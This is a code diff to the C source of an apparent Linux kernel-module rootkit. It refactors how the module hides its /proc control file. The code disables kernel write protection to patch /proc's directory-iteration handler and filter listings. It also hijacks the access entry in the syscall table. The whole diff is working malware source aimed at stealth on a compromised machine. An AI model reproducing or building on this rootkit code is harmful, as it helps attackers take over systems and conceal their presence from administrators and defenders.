@@ -18,17 +18,15 @@ static struct list_head *module_list;
 static struct proc_dir_entry *proc_rootkit;
 
 // Vars for proc manipulation
-static struct inode *proc_inode;
-static const struct file_operations *orig_proc_fops;
-static struct file_operations hacked_proc_fops;
-struct dir_context *backup_ctx;
+int (*orig_iterate_shared)(struct file *, struct dir_context *);
+int (*orig_filldir)(struct dir_context *, const char *, int, loff_t, u64,
+                    unsigned);
 
 // Vars for syscall hijacking
 static unsigned long *syscall_table;
 
-static struct path proc_path;
 typedef asmlinkage long (*sys_call_ptr_t)(const struct pt_regs *);
-static sys_call_ptr_t original_access;
+static sys_call_ptr_t orig_access;
 
 // Module hiding
 
@@ -75,13 +73,12 @@ unsigned long *find_syscall_table(void)
     return (unsigned long *)kallsyms_lookup_name("sys_call_table");
 }
 
-asmlinkage long hacked_access(const struct pt_regs *pt_regs)
+asmlinkage long rk_access(const struct pt_regs *pt_regs)
 {
     const char __user *filename = (const char __user *)pt_regs->di;
     int mode = (int)pt_regs->si;
     pr_info("Access: %s\n", filename);
-    // char *env_var = getenv(ENV_VAR);
-    return original_access(pt_regs);
+    return orig_access(pt_regs);
 }
 
 // Proc file interface
@@ -115,26 +112,19 @@ static ssize_t rk_proc_write(struct file *file, const char __user *ubuf, size_t 
     return count;
 }
 
-static int rk_filldir_t(struct dir_context *ctx, const char *proc_name, int len,
-                        loff_t off, u64 ino, unsigned int d_type)
+static int rk_filldir(struct dir_context *ctx, const char *proc_name, int len,
+                      loff_t off, u64 ino, unsigned int d_type)
 {
     if (module_hidden && (strncmp(proc_name, PROCFILE_NAME, strlen(PROCFILE_NAME) - 1) == 0))
         return 0;
-    return backup_ctx->actor(backup_ctx, proc_name, len, off, ino, d_type);
+    return orig_filldir(ctx, proc_name, len, off, ino, d_type);
 }
-
-struct dir_context rk_ctx = {
-    .actor = rk_filldir_t,
-};
 
 int rk_iterate_shared(struct file *file, struct dir_context *ctx)
 {
-    int result = 0;
-    rk_ctx.pos = ctx->pos;
-    backup_ctx = ctx;
-    result = orig_proc_fops->iterate_shared(file, &rk_ctx);
-    ctx->pos = rk_ctx.pos;
-    return result;
+    orig_filldir = ctx->actor;
+    *(filldir_t *)&ctx->actor = rk_filldir;
+    return orig_iterate_shared(file, ctx);
 }
 
 static const struct file_operations proc_rootkit_fops = {
@@ -144,6 +134,9 @@ static const struct file_operations proc_rootkit_fops = {
 
 static int proc_init(void)
 {
+    struct inode *proc_inode;
+    struct path proc_path;
+
     // Create entry for controlling rootkit
     proc_rootkit = proc_create(PROCFILE_NAME, S_IRUGO | S_IWUGO, NULL, &proc_rootkit_fops);
     if (!proc_rootkit)
@@ -151,21 +144,21 @@ static int proc_init(void)
 
     if (kern_path("/proc", 0, &proc_path))
         return -1;
-    // Get inode of proc
-    proc_inode = proc_path.dentry->d_inode;
-    // Make copy of file ops and backup orig
-    hacked_proc_fops = *proc_inode->i_fop;
-    orig_proc_fops = proc_inode->i_fop;
-    // Modify iterate_shared
-    hacked_proc_fops.iterate_shared = rk_iterate_shared;
-    // Change fops to hacked
-    proc_inode->i_fop = &hacked_proc_fops;
+
+    proc_inode = proc_path.dentry->d_inode; // Get inode of proc
+    orig_iterate_shared = proc_inode->i_fop->iterate_shared;
+    disable_write_protect();
+    ((struct file_operations *)proc_inode->i_fop)->iterate_shared = rk_iterate_shared;
+    enable_write_protect();
 
     return 0;
 }
 
 static void proc_clean(void)
 {
+    struct inode *proc_inode;
+    struct path proc_path;
+
     if (proc_rootkit != NULL)
     {
         proc_remove(proc_rootkit);
@@ -175,7 +168,9 @@ static void proc_clean(void)
     if (kern_path("/proc", 0, &proc_path))
         return;
     proc_inode = proc_path.dentry->d_inode;
-    proc_inode->i_fop = orig_proc_fops;
+    disable_write_protect();
+    ((struct file_operations *)proc_inode->i_fop)->iterate_shared = orig_iterate_shared;
+    enable_write_protect();
 }
 
 static int __init lkm_rootkit_init(void)
@@ -193,11 +188,11 @@ static int __init lkm_rootkit_init(void)
     syscall_table = find_syscall_table();
     pr_info("Found syscall_table at %lx\n", *syscall_table);
 
-    original_access = (sys_call_ptr_t)syscall_table[__NR_access];
+    orig_access = (sys_call_ptr_t)syscall_table[__NR_access];
 
     disable_write_protect();
 
-    syscall_table[__NR_access] = (unsigned long)hacked_access;
+    syscall_table[__NR_access] = (unsigned long)rk_access;
 
     enable_write_protect();
 
@@ -210,7 +205,7 @@ static void __exit lmk_rootkit_exit(void)
 
     disable_write_protect();
 
-    syscall_table[__NR_access] = (unsigned long)original_access;
+    syscall_table[__NR_access] = (unsigned long)orig_access;
 
     enable_write_protect();
 
